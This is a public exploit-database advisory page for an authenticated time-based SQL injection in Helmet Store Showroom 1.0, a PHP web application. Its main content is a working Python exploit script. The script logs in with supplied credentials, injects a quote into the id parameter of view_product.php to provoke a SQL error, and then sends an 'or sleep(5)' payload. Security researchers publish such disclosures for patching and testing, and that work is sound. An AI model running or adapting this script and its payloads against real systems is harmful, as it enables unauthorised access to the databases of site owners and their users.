---
title: Helmet Store Showroom 1.0 SQL Injection
url: https://cxsecurity.com/issue/WLB-2022110046
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-11-27
fetch_date: 2025-10-03T23:52:33.018753
---

# Helmet Store Showroom 1.0 SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Helmet Store Showroom 1.0 SQL Injection** **2022.11.26**  Credit:  **[syad](https://cxsecurity.com/author/syad/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")** | |

# Exploit Title: Helmet Store Showroom 1.0 - authenticated SQL Injection
# Date: 25-11-2022
# Exploit Author: syad
# Vendor Homepage: https://www.sourcecodester.com
# Software Link: https://www.sourcecodester.com/php/15851/helmet-store-showroom-site-php-and-mysql-free-source-code.html
# Version: 1.0
# Tested on: Windows 10 + XAMPP 3.2.4
# CVE ID : N/A
# Description
# The id parameter does not perform input validation on the view\_product.php file it allow authenticated Time Based SQL Injection.
import requests
import sys
import pyfiglet
sess = requests.Session()
proxies = {"https": "https://127.0.0.1:8080", "http": "http://127.0.0.1:8080"}
def login1(ip,username,password):
x = "http://%s/hss/classes/Login.php?f=login" % ip
login = {'username':username, 'password':password}
r = sess.post(x, data=login, proxies=proxies)
#print(r.content)
def login(ip):
x = ("http://%s/hss/admin") % ip
r = sess.get(x,proxies=proxies)
if "Welcome to Helmet Store Showroom - PHP" in r.text:
print("--------------------------------------------")
print("[+] Success Login")
def detect\_sql(ip):
x = "http://%s/hss/admin/?page=products/view\_product&id=2'" % ip
r = sess.get(x,proxies=proxies)
if "You have an error in your SQL syntax" in r.text:
print("[+] Found SQL Error")
def time\_based\_sqli(ip):
x = "http://%s/hss/admin/?page=products/view\_product&id=2'+or+sleep(5)--+-" % ip
r = sess.get(x,proxies=proxies)
print("[+] Time Based SQL Found")
print("[\*]!!! Time To Report !!!")
if \_\_name\_\_ == "\_\_main\_\_":
result = pyfiglet.figlet\_format("PWN")
print(result)
try:
ip = sys.argv[1].strip()
username = sys.argv[2].strip()
password = sys.argv[3].strip()
except IndexError:
print("[-] Usage %s <ip> <username> <password>" % sys.argv[0])
print("[-] Example: %s 192.168.1.x" % sys.argv[0])
sys.exit(-1)
login1(ip,username,password)
login(ip)
detect\_sql(ip)
time\_based\_sqli(ip)

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022110046)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top